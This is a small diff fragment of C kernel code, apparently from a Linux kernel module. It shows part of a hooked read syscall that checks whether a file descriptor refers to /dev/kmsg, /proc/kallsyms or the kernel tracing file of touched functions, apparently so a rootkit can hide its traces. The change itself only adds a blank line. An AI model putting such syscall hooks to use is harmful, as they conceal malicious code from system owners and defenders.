@@ -24,6 +24,7 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
     // Check if the fd is from /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
     file = fget(fd); // Gets the file object corresponding to the fd
     if (file) {
+	    
         // Check if the file is:
 	// 	- /dev/kmsg 
 	// 	- /proc/kallsyms or
